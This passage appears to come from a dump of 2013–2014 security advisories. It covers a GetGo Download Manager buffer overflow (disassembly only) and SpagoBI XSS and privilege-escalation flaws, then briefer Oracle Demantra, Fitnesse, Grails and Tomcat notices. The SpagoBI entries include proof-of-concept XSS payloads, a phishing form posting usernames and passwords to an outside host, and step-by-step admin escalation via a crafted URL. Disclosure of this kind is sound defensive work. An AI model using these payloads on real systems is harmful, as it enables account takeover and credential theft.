004A3A73 PUSH -1
004A3A75 PUSH GetGoDM.00644153
004A3A7A MOV EAX,DWORD PTR FS:[0]
004A3A80 PUSH EAX
004A3A81 SUB ESP,1C
004A3A84 MOV EAX,DWORD PTR DS:[6E6FB8]
004A3A89 XOR EAX,EBP
004A3A8B PUSH EAX
004A3A8C LEA EAX,DWORD PTR SS:[EBP-C]
004A3A8F MOV DWORD PTR FS:[0],EAX
004A3A95 MOV DWORD PTR SS:[EBP-28],ECX
004A3A98 MOV DWORD PTR SS:[EBP-14],0
004A3A9F MOV EAX,DWORD PTR SS:[EBP+C]
004A3AA2 PUSH EAX
004A3AA3 PUSH 0
004A3AA5 MOV ECX,DWORD PTR SS:[EBP+8]
004A3AA8 PUSH ECX
004A3AA9 CALL GetGoDM.004EA0A0
004A3AAE ADD ESP,0C
004A3AB1 MOV DWORD PTR SS:[EBP-18],1
004A3AB8 MOV DWORD PTR SS:[EBP-10],1
004A3ABF MOV DWORD PTR SS:[EBP-20],0
004A3AC6 PUSH GetGoDM.0066D7F6 ; /Arg1 = 0066D7F6
004A3ACB LEA ECX,DWORD PTR SS:[EBP-1C] ; |
004A3ACE CALL GetGoDM.004090A0 ; GetGoDM.004090A0
004A3AD3 MOV DWORD PTR SS:[EBP-4],0
004A3ADA /MOV EDX,1
004A3ADF |TEST EDX,EDX
004A3AE1 |JE SHORT GetGoDM.004A3B5A
004A3AE3 |MOV EAX,DWORD PTR SS:[EBP+10]
004A3AE6 |PUSH EAX ; /Arg3
004A3AE7 |PUSH 1 ; |Arg2 = 00000001
004A3AE9 |MOV ECX,DWORD PTR SS:[EBP-10] ; |
004A3AEC |MOV EDX,DWORD PTR SS:[EBP+8] ; |
004A3AEF |LEA EAX,DWORD PTR DS:[EDX+ECX-1] ; |
004A3AF3 |PUSH EAX ; |Arg1
004A3AF4 |MOV ECX,DWORD PTR SS:[EBP-28] ; |
004A3AF7 |ADD ECX,0C ; |
004A3AFA |CALL GetGoDM.0049DF80 ; GetGoDM.0049DF80
004A3AFF |MOV DWORD PTR SS:[EBP-18],EAX
004A3B02 |CMP DWORD PTR SS:[EBP-18],0
004A3B06 |JNZ SHORT GetGoDM.004A3B11
004A3B08 |MOV DWORD PTR SS:[EBP-14],0
004A3B0F |JMP SHORT GetGoDM.004A3B5A
004A3B11 |MOV ECX,DWORD PTR SS:[EBP+8]
004A3B14 |ADD ECX,DWORD PTR SS:[EBP-10]
004A3B17 |MOV BYTE PTR DS:[ECX],0
004A3B1A |MOV EDX,DWORD PTR SS:[EBP+8]
004A3B1D |PUSH EDX ; /Arg1
004A3B1E |LEA ECX,DWORD PTR SS:[EBP-1C] ; |
004A3B21 |CALL GetGoDM.004497C0 ; GetGoDM.004497C0
004A3B26 |PUSH 0 ; /Arg2 = 00000000
004A3B28 |PUSH GetGoDM.0066D7F8 ; |Arg1 = 0066D7F8 ASCII """"
004A3B2D |LEA ECX,DWORD PTR SS:[EBP-1C] ; |
004A3B30 |CALL GetGoDM.00409560 ; GetGoDM.00409560
004A3B35 |MOV DWORD PTR SS:[EBP-20],EAX
004A3B38 |CMP DWORD PTR SS:[EBP-20],-1
004A3B3C |JE SHORT GetGoDM.004A3B4F
004A3B3E |MOV EAX,DWORD PTR SS:[EBP+8]
004A3B41 |ADD EAX,DWORD PTR SS:[EBP-20]
004A3B44 |MOV BYTE PTR DS:[EAX],0
004A3B47 |MOV ECX,DWORD PTR SS:[EBP-20]
004A3B4A |MOV DWORD PTR SS:[EBP-14],ECX
004A3B4D |JMP SHORT GetGoDM.004A3B5A
004A3B4F |MOV EDX,DWORD PTR SS:[EBP-10]
004A3B52 |ADD EDX,1
004A3B55 |MOV DWORD PTR SS:[EBP-10],EDX
004A3B58 JMP SHORT GetGoDM.004A3ADA
004A3B5A MOV EAX,DWORD PTR SS:[EBP-14]
004A3B5D MOV DWORD PTR SS:[EBP-24],EAX
004A3B60 MOV DWORD PTR SS:[EBP-4],-1
004A3B67 LEA ECX,DWORD PTR SS:[EBP-1C]
004A3B6A CALL GetGoDM.004091E0
004A3B6F MOV EAX,DWORD PTR SS:[EBP-24]
004A3B72 MOV ECX,DWORD PTR SS:[EBP-C]
004A3B75 MOV DWORD PTR FS:[0],ECX
004A3B7C POP ECX
004A3B7D MOV ESP,EBP
004A3B7F POP EBP
004A3B80 RETN 0C
7. SOLUTION
-----------
None
8. REPORT TIMELINE
------------------
2014-02-23: Discovery of the vulnerability
2014-02-23: Vendor Notification #1
2014-02-26: MITRE assigns CVE-2014-2206
2014-03-01: Project is dead
2014-03-02: Full Disclosure
9 . REFERENCES
--------------
http://www.rcesecurity.com/2014/03/cve-2014-2206-getgo-download-manager-http-response-header-buffer-overflow-remote-code-execution"
7250,[CVE-2013-6234] XSS File Upload in SpagoBI v4.0,,CVE-2013-6234,"###################################################
01. ### Advisory Information ###
Title: XSS File Upload
Date published: 2014-03-01
Date of last update: 2014-03-01
Vendors contacted: Engineering Group
Discovered by: Christian Catalano
Severity: Medium
02. ### Vulnerability Information ###
CVE reference: CVE-2013-6234
CVSS v2 Base Score: 4
CVSS v2 Vector: (AV:N/AC:L/Au:S/C:N/I:P/A:N)
Component/s: SpagoBI
Class: Input Manipulation
03. ### Introduction ###
SpagoBI[1] is an Open Source Business Intelligence suite, belonging to the free/open source SpagoWorld initiative, founded and supported by Engineering Group[2].
It offers a large range of analytical functions, a highly functional semantic layer often absent in other open source platforms and projects, and a respectable set of advanced data visualization features including geospatial analytics.
[3]SpagoBI is released under the Mozilla Public License, allowing its commercial use. SpagoBI is hosted on OW2 Forge[4] managed by OW2 Consortium, an independent open-source software community.
[1] - http://www.spagobi.org
[2] - http://www.eng.it
[3] - http://www.spagoworld.org/xwiki/bin/view/SpagoBI/PressRoom?id=SpagoBI-ForresterWave-July2012
[4] - http://forge.ow2.org/projects/spagobi
04. ### Vulnerability Description ###
SpagoBI contains a flaw that may allow a remote attacker to execute arbitrary code. This flaw exists because the application does not restrict uploading for specific file types from Worksheet designer function.
This may allow a remote attacker to upload arbitrary files (e.g. .html for XSS) that would execute arbitrary script code in a user's browser within the trust relationship between their browser and the server or more easily conduct more serious attacks.
05. ### Technical Description / Proof of Concept Code ###
An attacker (a SpagoBI malicious user with a restricted account) can upload a file from Worksheet designer function.
To reproduce the vulnerability follow the provided information and steps below:
- Using a browser log on to SpagoBI with restricted account (e.g. Business User Account)
- Go on: Worksheet designer function
- Click on: Image and Choose image
- Upload malicious file and save it
XSS Malicious File Upload Attack has been successfully completed!
More details about SpagoBI Worksheet Engine and Worksheet designer
http://wiki.spagobi.org/xwiki/bin/view/spagobi_server/Worksheet#HWorksheetoverview
(e.g. Malicious File: xss.html)
<!DOCTYPE html>
<html>
<head>
<script>
function myFunction()
{alert(""XSS"");}
</script>
</head>
<body>
<input type=""button"" onclick=""myFunction()"" value=""Show alert box"">
</body>
</html>
06. ### Business Impact ###
Exploitation of the vulnerability requires low privileged application user account but low or medium user interaction. Successful exploitation of the vulnerability results in session hijacking, client-side phishing, client-side external redirects or malware loads and client-side manipulation of the vulnerable module context.
07. ### Systems Affected ###
This vulnerability was tested against: SpagoBI 4.0
Older versions are probably affected too, but they were not checked.
08. ### Vendor Information, Solutions and Workarounds ###
This issue is fixed in SpagoBI v4.1, which can be downloaded from:
http://forge.ow2.org/project/showfiles.php?group_id=204
Fixed by vendor [verified]
09. ### Credits ###
This vulnerability has been discovered by:
Christian Catalano aka wastasy ch(dot)catalano(at)gmail(dot)com
10. ### Vulnerability History ###
October 09th, 2013: Vulnerability identification
October 22th, 2013: Vendor notification to [SpagoBI Team]
November 05th, 2013: Vendor Response/Feedback from [SpagoBI Team]
December 16th, 2013: Vendor Fix/Patch [SpagoBI Team]
January 16th, 2014: Fix/Patch Verified
March 01st, 2014: Vulnerability disclosure
11. ### Disclaimer ###
The information contained within this advisory is supplied ""as-is"" with
no warranties or guarantees of fitness of use or otherwise.
I accept no responsibility for any damage caused by the use or misuse of this information.
###################################################"
7251,[CVE-2013-6233] Persistent HTML Script Insertion permits offsite-bound forms in SpagoBI v4.0,,CVE-2013-6233,"###################################################
01. ### Advisory Information ###
Title: Persistent HTML Script Insertion permits offsite-bound forms
Date published: 2014-03-01
Date of last update: 2014-03-01
Vendors contacted: Engineering Group
Discovered by: Christian Catalano
Severity: Medium
02. ### Vulnerability Information ###
CVE reference: CVE-2013-6233
CVSS v2 Base Score: 4
CVSS v2 Vector: (AV:N/AC:L/Au:S/C:N/I:P/A:N)
Component/s: SpagoBI
Class: Input Manipulation
03. ### Introduction ###
SpagoBI[1] is an Open Source Business Intelligence suite, belonging to the free/open source SpagoWorld initiative, founded and supported by Engineering Group[2].
It offers a large range of analytical functions, a highly functional semantic layer often absent in other open source platforms and projects, and a respectable set of advanced data visualization features including geospatial analytics.
[3]SpagoBI is released under the Mozilla Public License, allowing its commercial use. SpagoBI is hosted on OW2 Forge[4] managed by OW2 Consortium, an independent open-source software community.
[1] - http://www.spagobi.org
[2] - http://www.eng.it
[3] - http://www.spagoworld.org/xwiki/bin/view/SpagoBI/PressRoom?id=SpagoBI-ForresterWave-July2012
[4] - http://forge.ow2.org/projects/spagobi
04. ### Vulnerability Description ###
SpagoBI contains a flaw that allows persistent script insertion.
This may allow a remote attacker to inject HTML code including forms that load on a remote site, which can allow the attacker to conduct a phishing attack on a user and capture their credentials.
05. ### Technical Description / Proof of Concept Code ###
The vulnerability is located in some SpagoBI input fields
(e.g.'Description' input field from 'Short document metadata')
To reproduce the vulnerability, the attacker (a malicious user) can add the malicious HTML script code:
<form method=""POST"" action=""http://www.mocksite.org/login/login.php."">
Username: <input type=""text"" name=""username"" size=""15"" /><br />
Password: <input type=""password"" name=""passwort"" size=""15"" /><br />
<div align=""center"">
<p><input type=""submit"" value=""Login"" /></p>
</div>
</form>
in 'Description' input field from 'Short document metadata' and click on save button.
The code execution happens when the victim (an unaware user) click on 'Short document metadata'.
This is not the only way to inject malicious HTML code in the SpagoBI web app.
06. ### Business Impact ###
Exploitation of the vulnerability requires low privileged application user account but low or medium user interaction. Successful exploitation of the vulnerability results in persistent phishing and persistent external redirects.
07. ### Systems Affected ###
This vulnerability was tested against: SpagoBI 4.0
Older versions are probably affected too, but they were not checked.
08. ### Vendor Information, Solutions and Workarounds ###
This issue is fixed in SpagoBI v4.1, which can be downloaded from:
http://forge.ow2.org/project/showfiles.php?group_id=204
Fixed by vendor [verified]
09. ### Credits ###
This vulnerability has been discovered by:
Christian Catalano aka wastasy ch(dot)catalano(at)gmail(dot)com
10. ### Vulnerability History ###
October 08th, 2013: Vulnerability identification
October 22th, 2013: Vendor notification to [SpagoBI Team]
November 05th, 2013: Vendor Response/Feedback from [SpagoBI Team]
December 16th, 2013: Vendor Fix/Patch [SpagoBI Team]
January 16th, 2014: Fix/Patch Verified
March 01st, 2014: Vulnerability disclosure
11. ### Disclaimer ###
The information contained within this advisory is supplied ""as-is"" with
no warranties or guarantees of fitness of use or otherwise.
I accept no responsibility for any damage caused by the use or misuse of this information.
###################################################"
7252,[CVE-2013-6232] Persistent Cross-Site Scripting (XSS) in SpagoBI v4.0,,CVE-2013-6232,"###################################################
01. ### Advisory Information ###
Title: Persistent Cross-Site Scripting (XSS) in SpagoBI
Date published: 2014-03-01
Date of last update: 2014-03-01
Vendors contacted: Engineering Group
Discovered by: Christian Catalano
Severity: High
02. ### Vulnerability Information ###
CVE reference: CVE-2013-6232
CVSS v2 Base Score: 4
CVSS v2 Vector: (AV:N/AC:L/Au:S/C:N/I:P/A:N)
Component/s: SpagoBI
Class: Input Manipulation
03. ### Introduction ###
SpagoBI[1] is an Open Source Business Intelligence suite, belonging to the free/open source SpagoWorld initiative, founded and supported by Engineering Group[2].
It offers a large range of analytical functions, a highly functional semantic layer often absent in other open source platforms and projects, and a respectable set of advanced data visualization features including geospatial analytics.
[3]SpagoBI is released under the Mozilla Public License, allowing its commercial use.
SpagoBI is hosted on OW2 Forge[4] managed by OW2 Consortium, an independent open-source software community.
[1] - http://www.spagobi.org
[2] - http://www.eng.it
[3] - http://www.spagoworld.org/xwiki/bin/view/SpagoBI/PressRoom?id=SpagoBI-ForresterWave-July2012
[4] - http://forge.ow2.org/projects/spagobi
04. ### Vulnerability Description ###
SpagoBI contains a flaw that allows persistent cross-site scripting (XSS) attacks. This flaw exists because the application does not validate certain unspecified input before returning it to the user. This may allow an attacker to create a specially crafted request that would execute arbitrary script code in a user's browser within the trust relationship between their browser and the server.
05. ### Technical Description / Proof of Concept Code ###
In execution page can be visible a toolbar with various icons useful for the user to perform actions related to the document runs.
The user can insert a note about the executed document.
The note is associated to the document with relative parameters value and to the user.
It can be public or private, so public notes are visible to all users while the private notes are visible only from the user creator.
An attacker (a SpagoBI malicious user with a restricted account ) can insert a note with jasvascript code:
<object data=""javascript:alert('XSS')""></object>
and save it in public mode.
The code execution happens when the victim (an unaware user) click on annotate document detail.
This is not the only way to add malicious code in the SpagoBI web app.
06. ### Business Impact ###
Exploitation of the vulnerability requires low privileged application user account but low or medium user interaction.
Successful exploitation of the vulnerability results in session hijacking, client-side phishing, client-side external redirects or malware loads and client-side manipulation of the vulnerable module context.
07. ### Systems Affected ###
This vulnerability was tested against: SpagoBI 4.0
Older versions are probably affected too, but they were not checked.
08. ### Vendor Information, Solutions and Workarounds ###
This issue is fixed in SpagoBI v4.1, which can be downloaded from:
http://forge.ow2.org/project/showfiles.php?group_id=204
Fixed by vendor [verified]
09. ### Credits ###
This vulnerability has been discovered by:
Christian Catalano aka wastasy ch(dot)catalano(at)gmail(dot)com
10. ### Vulnerability History ###
October 08th, 2013: Vulnerability identification
October 22th, 2013: Vendor notification to [SpagoBI Team]
November 05th, 2013: Vendor Response/Feedback from [SpagoBI Team]
December 16th, 2013: Vendor Fix/Patch [SpagoBI Team]
January 16th, 2014: Fix/Patch Verified
March 01st, 2014: Vulnerability disclosure
11. ### Disclaimer ###
The information contained within this advisory is supplied ""as-is"" with
no warranties or guarantees of fitness of use or otherwise.
I accept no responsibility for any damage caused by the use or misuse of this information.
###################################################"
7254,[CVE-2013-6231] Remote Privilege Escalation in SpagoBI v4.0,,CVE-2013-6231,"###################################################
01. ### Advisory Information ###
Title: Remote Privilege Escalation in SpagoBI
Date published: 2013-02-28
Date of last update: 2013-02-28
Vendors contacted: Engineering Group
Discovered by: Christian Catalano
Severity: High
02. ### Vulnerability Information ###
CVE reference: CVE-2013-6231
CVSS v2 Base Score: 9
CVSS v2 Vector: (AV:N/AC:L/Au:S/C:C/I:C/A:C)
Component/s: SpagoBI
Class: Input Manipulation
03. ### Introduction ###
SpagoBI[1] is an Open Source Business Intelligence suite, belonging to the free/open source SpagoWorld initiative, founded and supported by Engineering Group[2].
It offers a large range of analytical functions, a highly functional semantic layer often absent in other open source platforms and projects, and a respectable set of advanced data visualization features including geospatial analytics.[3]
SpagoBI is released under the Mozilla Public License, allowing its commercial use.
SpagoBI is hosted on OW2 Forge[4] managed by OW2 Consortium, an independent open-source software community.
[1] - http://www.spagobi.org
[2] - http://www.eng.it
[3] - http://www.spagoworld.org/xwiki/bin/view/SpagoBI/PressRoom?id=SpagoBI-ForresterWave-July2012
[4] - http://forge.ow2.org/projects/spagobi
04. ### Vulnerability Description ###
SpagoBI contains a flaw that leads to unauthorized privileges being gained. The issue is triggered when the servlet (action): AdapterHTTP?ACTION_NAME=MANAGE_USER_ACTION is executed with specifically crafted input, and may allow a remote attacker to gain Administrator role privileges.
05. ### Technical Description / Proof of Concept Code ###
An attacker (a SpagoBI malicious Business User with RSM role ) can invoke via URL the servlet (action):
AdapterHTTP?ACTION_NAME=MANAGE_USER_ACTION
to gain SpagoBI Administrator privilege.
To reproduce the vulnerability follow the provided information and steps below:
- Using a browser log on to SpagoBI with restricted account (e.g. Business User Account)
- Execute:
https://localhost/SpagoBI/servlet/AdapterHTTP?ACTION_NAME=MANAGE_USER_ACTION
- Select your account from Users List
- Select Administrator Role from Roles tab and save it
Remote Privilege Escalation Attack has been successfully completed!
06. ### Business Impact ###
Successful exploitation of the vulnerability may allow a remote, authenticated attacker to elevate privileges and obtain full access to the affected system.
The attacker could exploit the vulnerability to become administrator and retrieve or publish any kind of data.
07. ### Systems Affected ###
This vulnerability was tested against: SpagoBI 4.0
Older versions are probably affected too, but they were not checked.
08. ### Vendor Information, Solutions and Workarounds ###
This issue is fixed in SpagoBI v4.1, which can be downloaded from:
http://forge.ow2.org/project/showfiles.php?group_id=204
Fixed by vendor [verified]
09. ### Credits ###
This vulnerability has been discovered by:
Christian Catalano aka wastasy ch(dot)catalano(at)gmail(dot)com
10. ### Vulnerability History ###
October 08th, 2013: Vulnerability identification
October 22th, 2013: Vendor notification to [SpagoBI Team]
November 05th, 2013: Vendor Response/Feedback from [SpagoBI Team]
December 16th, 2013: Vendor Fix/Patch [SpagoBI Team]
January 16th, 2014: Fix/Patch Verified
February 28th, 2014: Vulnerability disclosure
11. ### Disclaimer ###
The information contained within this advisory is supplied ""as-is"" with
no warranties or guarantees of fitness of use or otherwise.
I accept no responsibility for any damage caused by the use or misuse of this information.
###################################################"
7255,CVE-2014-0372 - SQL Injection in Oracle Demantra,,CVE-2014-0372,"Vulnerability title: SQL Injection in Oracle Demantra
CVE: CVE-2014-0372
Vendor: Oracle
Product: Demantra
Affected version: 12.2.1
Fixed version: 12.2.3
Reported by: Oliver Gruskovnjak
Details:
The Oracle Demantra application is vulnerable to SQL injection.
An attacker with access to the vulnerable pages could manipulate the
queries being sent to the database, potentially enabling them to extract
sensitive information or modify content within the application.
In this particular instance, exploitation was more difficult as the
results of the attack had to inferred based on the pages returned, often
referred to as ï¿½blindï¿½ SQL Injection.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-0372/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
7256,Re: CVE-2014-5795 - Database Credentials Leak in Oracle Demantra,,CVE-2014-5795,"Apologies, the CVE-ID for this advisory is actually CVE-2013-5795"
7257,Re: CVE-2014-5880 - Authentication Bypass in Oracle Demantra,,CVE-2014-5880,"Apologies, the CVE-ID for this advisory is actually CVE-2013-5880"
7258,CVE-2014-5795 - Database Credentials Leak in Oracle Demantra,,CVE-2014-5795,"Vulnerability title: Database Credentials Leak in Oracle Demantra
CVE: CVE-2014-5795
Vendor: Oracle
Product: Demantra
Affected version: 12.2.1
Fixed version: 12.2.3
Reported by: Oliver Gruskovnjak
Details:
Oracle Demantra version 12.2.1 has a backend function that allows anyone
to retrieve the database instance name and the corresponding credentials.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-5795/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
7259,CVE-2014-5880 - Authentication Bypass in Oracle Demantra,,CVE-2014-5880,"Vulnerability title: Authentication Bypass in Oracle Demantra
CVE: CVE-2014-5880
Vendor: Oracle
Product: Demantra
Affected version: 12.2.1
Fixed version: 12.2.3
Reported by: Oliver Gruskovnjak
Details:
The authentication filter in Oracle Demantra is broken by design.
For example the page:
/demantra/common/loginCheck.jsp
Is accessible by an unauthenticated user and is therefore listed in the
whitelisted URLs list. It is now possible to use this whitelisted URL to
access restricted URLs.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-5880/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
7260,CVE-2014-1216 - Remote Command Execution in Fitnesse Wiki,,CVE-2014-1216,"Vulnerability title: Remote Command Execution in Fitnesse Wiki
CVE: CVE-2014-1216
Vendor: Fitnesse
Product: Wiki
Affected version: v20131110 and earlier
Fixed version: N/A
Reported by: Jerzy Kramarz
Details:
The Fitnesse wiki does not validate the syntax of edited pages to
validate whether the pages are introducing any extra parameters that
could be executed in the context of the application. This vulnerability
could be exploited by remote attackers to introduce external commands
into the workflow of the application that would execute them.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-1216/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
7267,Update: CVE-2014-0053 Information Disclosure when using Grails,,CVE-2014-0053,"CVE-2014-0053 Information Disclosure in Grails applications
Severity: Important
Vendor: Grails by Pivotal
Product Affected:
- Grails Resources plugin 1.0.0 to 1.2.5
Products known to depend on the affected product:
- Grails 2.0.0 to 2.3.6
Description:
The Grails resources plug-in, a default dependency of Grails since
2.0.0, does not block access to resources located under /WEB-INF or
/META-INF by default. This means that both configuration files and
class files are publicly accessible when they should be private.
Further, the filtering mechanism that applies any configured block
does not normalise the requested URI before filtering allowing the
block to be bypassed via directory traversal.
Mitigation:
Users of affected versions should apply one of the following
mitigations:
- Upgrade the resources plug-in to 1.2.6, configure the resources
plug-in to block access to resources under /WEB-INF and /META-INF
and the redploy the application
- Prevent access to resources under /WEB-INF and /META-INF in the
reverse proxy (if one is used)
Possible configuration options to block access to /WEB-INF include
adding the following to grails-app/conf/Config.groovy:
grails.resources.adhoc.includes = ['/images/**', '/css/**', '/js/**', '/plugins/**']
grails.resources.adhoc.excludes = ['**/WEB-INF/**','**/META-INF/**']
Credit:
The original /WEB-INF issue was identified by @Ramsharan065 but was
reported publicly to the Grails team via Twitter. Pivotal strongly
encourages responsible reporting of security vulnerabilities via
security gopivotal com
The /META-INF aspects of this issue were identified by numerous
individuals and reported responsibly to either the Grails team or to
the Pivotal Security team.
The directory traversal aspects of this vulnerability were reported
to the Pivotal security team by Kristian Mattila.
References:
https://twitter.com/Ramsharan065/status/434975409134792704
http://www.gopivotal.com/security/cve-2014-0053 (may take 24 hours to update)
History:
2014-Feb-16: /WEB-INF issue made public
2014-Feb-19: Initial vulnerability report published
2014-Feb-27: Updated to include information on /META-INF and directory
traversal aspects of this vulnerability.
Separated out affected product and dependencies
Extended affected Grails versions to include 2.3.6
Updated mitigations."
7282,[SECURITY] CVE-2013-4590 Information disclosure via XXE when running untrusted web applications,,CVE-2013-4590,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2013-4590 Information disclosure via XXE when running untrusted web
applications
Severity: Low
Vendor: The Apache Software Foundation
Versions Affected:
- - Apache Tomcat 8.0.0-RC1 to 8.0.0-RC5
- - Apache Tomcat 7.0.0 to 7.0.47
- - Apache Tomcat 6.0.0 to 6.0.37
Description:
Application provided XML files such as web.xml, context.xml, *.tld,
*.tagx and *.jspx allowed XXE which could be used to expose Tomcat
internals to an attacker. This vulnerability only occurs when Tomcat is
running web applications from untrusted sources such as in a shared
hosting environment.
Mitigation:
Users of affected versions should apply one of the following mitigations
- - Upgrade to Apache Tomcat 8.0.0-RC10 or later
(8.0.0-RC6 to 8.0.0-RC9 contain the fix but were not released)
- - Upgrade to Apache Tomcat 7.0.50 or later
(7.0.48 to 7.0.49 contain the fix but were not released)
- - Upgrade to Apache Tomcat 6.0.39 or later
(6.0.38 contains the fix but was not released)
Credit:
This issue was identified by the Apache Tomcat security team.
References:
[1] http://tomcat.apache.org/security-8.html
[2] http://tomcat.apache.org/security-7.html
[3] http://tomcat.apache.org/security-6.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Thunderbird - http://www.enigmail.net/
iQIcBAEBAgAGBQJTDHxJAAoJEBDAHFovYFnnyWAQAIoducHGYKhqCCq7SbbkeUxC
2y8HxdYKo0T/AfolZoTlFInPnVDG8cvoPjEKO7MVzmWJaXjH4lOPYWAzss/N5//M
SCczevb1CSmw+m6d6TWs5YeJSGdJdEZuGjIo4GBTLYymUGPB88JdbeeIDvsVeWIx
agPaXN80aNady+uPbbpPh3mLIRchi00Ui7vI+0eWMVzcOED1MsvNiPyaGk7eHIhQ
nAoiG1QqY68yps1i9lTL1y5jaTklhf6Rh0BKRHA5oLBC2XH6vzKfVw4DVbYTDIve
N74s4BssSCMgKDzIGG1zwvU6EdLrHW+NVmfKDey+D0j6THT3rTPiQC4QVjZfVY0u
YLuLkX/kobjV2ESgXj7EBTzxuOB/F+bweZ4PfdSV723ggQclwotzLQvEfKkcc4WY
taYl4D33gL55QvCsKCCDYbCZklZxOyQ34mly70064tOEFE/nuSq5hIS887Jh0WW2
5pDweW2GZxjXMPAs3sFpmx2UW8VEepxYOhVla/9O+AseHePlyjihEekpB+83Gotk
YAFCpCrkXLX9i2B/LW65DYJYUycW+s6j1kQzGyJmsF0ff45airKhrcHvBLtPGm4B
dhY5hLhaQh//eJvJlNoAq2QfDEiPEqR5Ks91mhkp+4JBP1ubMyGbQo/Di0jShoJR
dwR7dpwk2mIO/l6BnAv6
=hR9C
-----END PGP SIGNATURE-----"
7283,[SECURITY] CVE-2013-4322 Incomplete fix for CVE-2012-3544 (Denial of Service),,CVE-2013-4322,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2013-4322 Incomplete fix for CVE-2012-3544 (Denial of Service)
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- - Apache Tomcat 8.0.0-RC1 to 8.0.0-RC5
- - Apache Tomcat 7.0.0 to 7.0.47
- - Apache Tomcat 6.0.0 to 6.0.37
Description:
The fix for CVE-2012-3544 was not complete. It did not cover the
following cases:
a) Chunk extensions were not limited
b) Whitespace after the : in a trailing header was not limited
Mitigation:
Users of affected versions should apply one of the following mitigations
- - Upgrade to Apache Tomcat 8.0.0-RC10 or later
(8.0.0-RC6 to 8.0.0-RC9 contain the fix but were not released)
- - Upgrade to Apache Tomcat 7.0.50 or later
(7.0.48 to 7.0.49 contain the fix but were not released)
- - Upgrade to Apache Tomcat 6.0.39 or later
(6.0.38 contains the fix but was not released)
Credit:
This issue was partly identified by the Apache Tomcat security team and
party by Saran Neti of TELUS Security Labs.
References:
[1] http://tomcat.apache.org/security-8.html
[2] http://tomcat.apache.org/security-7.html
[3] http://tomcat.apache.org/security-6.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Thunderbird - http://www.enigmail.net/
iQIcBAEBAgAGBQJTDHxCAAoJEBDAHFovYFnnAtcP/0U8NgjCuhFBps1tAIqAa+ty
nLMYz3rgxHcY9ClWrJEBgGiIGb2wDQfylNsWR67PF/ue6yhLf+Bu5xs858Thr8V1
98ODkrQemNc9dcIdLJaRcSo05vzNCEN3v4vR9cpPpQpW8TB9y8L1HXmZEiGkM7ZD
nwa6E6GDJizkwR+3Qs11r3tAxNAHPn611EYajYLf7+4vPLqgV4GOx2/D7ol/wTm0
3BM15VZjTtlHqrtghUOdXYEzoXwR9BKMVoMtED3e++5i0vCuvvLToxTJ6jI/QjjE
UNm/hrfZK5ro3d+rzjOboLXIooAksK3A5UXxlvRi26ZgP3Nd0y8dN925WWfg2jXX
V1saa+42vpI6g4NcINIbFnBqfPdM/xKSIuyyXDmmTF2rUHQftcToLikzmSDZlm4c
edTyL+A4FcbEq8uymXwE/iA9KKa3PDcZheUw07YALp9JhFI6rfQT472cUavfNcGy
h0nxkHg2hU4yUBPm2PSyoTAokkjhDgRvGgX0hA3ljSi0SpHyTwPfoUIwUb+Emgmb
Vk00OJRJGtZs/GAL0TCd+LW96664Tx9oAqvgcLA3dZwLk94ivD5SC3Rl9xlyd4lF
cgLCOvzwxHcAh7syNd8orWjmyZsJ1vVqGoL1waK1hl1AQNxoJRfDixSlNjchpBxO
tCLvVC7UbgC0PFda+7kL
=Hzxr
-----END PGP SIGNATURE-----"
7284,[SECURITY] CVE-2013-4286 Incomplete fix for CVE-2005-2090 (Information disclosure),,CVE-2013-4286,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2013-4286 Incomplete fix for CVE-2005-2090 (Information disclosure)
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- - Apache Tomcat 8.0.0-RC1
- - Apache Tomcat 7.0.0 to 7.0.42
- - Apache Tomcat 6.0.0 to 6.0.37
Description:
The fix for CVE-2005-2090 was not complete. It did not cover the
following cases:
- - content-length header with chunked encoding over any HTTP connector
- - multiple content-length headers over any AJP connector
Requests with multiple content-length headers or with a content-length
header when chunked encoding is being used should be rejected as
invalid. When multiple components (firewalls, caches, proxies and
